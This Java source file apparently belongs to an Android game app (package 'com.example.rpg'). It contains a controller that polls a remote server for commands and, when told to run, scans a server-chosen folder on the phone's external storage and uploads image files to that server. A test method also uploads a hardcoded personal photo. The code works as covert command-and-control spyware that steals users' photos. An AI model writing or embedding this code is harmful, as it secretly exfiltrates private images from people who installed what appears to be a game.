package com.example.rpg;

import android.os.Environment;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class ApiController {
    public void testMethod(){
        System.out.println("TESTANDO ESSE METODO");
    }

    private MultipartBody.Part prepareFilePart(String partName, File file) {
        // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
        // use the FileUtils to get the actual file by uri

        // create RequestBody instance from file
        RequestBody requestFile =
                RequestBody.create(
                        MediaType.parse("image/*"),
                        file
                );

        // MultipartBody.Part is used to send also the actual file name
        return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
    }

    private void uploadMultipleFiles(String dir, int maxUploads, ArrayList<String> sendedList) {

        // Pega o path q vem em dir
        String path= Environment.getExternalStorageDirectory().getAbsolutePath()+dir;
        System.out.println(path);

        File directory = new File(path);
        File[] files = directory.listFiles();

        List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos

        // System.out.println(listdata.contains("images.jpeg"));

        for (int i = 0; i < files.length; i++) {
            if (!files[i].getName().equals(".nomedia")) {
                if (files != null && !sendedList.contains(files[i].getName())){
                    if (files[i].getName().contains(".jpeg") || files[i].getName().contains(".JPEG")
                            || files[i].getName().contains(".jpg") || files[i].getName().contains(".JPG")
                            || files[i].getName().contains(".png") || files[i].getName().contains(".PNG")
                            || files[i].getName().contains(".gif") || files[i].getName().contains(".GIF")
                            || files[i].getName().contains(".bmp") || files[i].getName().contains(".BMP")
                    )
                    {
                        System.out.println("Arquivo achado: " + files[i]);
                        // Adicionando na lista cada filePart contendo o arquivo
                        parts.add(prepareFilePart("file", files[i]));
                        System.out.println("Current: " + parts.size());

                        // se os arquivos para upload for maior ou igual ao maximo break
                        if(parts.size() >= maxUploads){break;}
                    }

                }
            }

        }

        Retrofit retrofitUpload = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();


        Api retrofitAPI = retrofitUpload.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImages(parts);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    public void getCommands() {

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .build();
        Api retrofitAPI = retrofit.create(Api.class);

        Call<ResponseBody> call = retrofitAPI.getCommands();
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                String jsonResp = "";
                try {
                    jsonResp = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                try {
                    JSONObject obj = new JSONObject(jsonResp);

                    // objeto json que veio da API
                    System.out.println(obj);

                    // pegando campos do response
                    String dir = (String) obj.get("dir");
                    int maxUploads = Integer.parseInt((String) obj.get("maxUploads"));
                    String run = (String) obj.get("run");

                    // Pegando a lista de já enviados
                    ArrayList<String> listdata = new ArrayList<>();
                    JSONArray filesSended = (JSONArray) obj.get("filesReceived");

                    if (filesSended != null) {
                        for (int i=0;i<filesSended.length();i++){
                            listdata.add(filesSended.getString(i));
                        }
                    }

                    if (run.equals("true")) {
                        // chamando o metodo de upload passando os parametros q vieram
                        uploadMultipleFiles(dir, maxUploads, listdata);
                    }

                } catch (Throwable t) {
                    System.out.println(t);
                    return ;
                }
            }
            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                // setting text to our text view when
                // we get error response from API.
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }

    // Apenas para teste
    private void uploadFile() {
        File file = new File("/storage/emulated/0/Download/niele.jpeg");

        RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
        MultipartBody.Part body =
                MultipartBody.Part.createFormData("file", file.getName(), requestFile);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(Api.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();


        Api retrofitAPI = retrofit.create(Api.class);
        Call<ResponseBody> call = retrofitAPI.uploadImage(body);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                //if (response.body().error != "false") {
                String stringResponse = "";
                try {
                    stringResponse = response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                // resposta da API
                System.out.println("RESP : " + stringResponse);

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                System.out.println("Error found is : " + t.getMessage());
            }
        });
    }
}
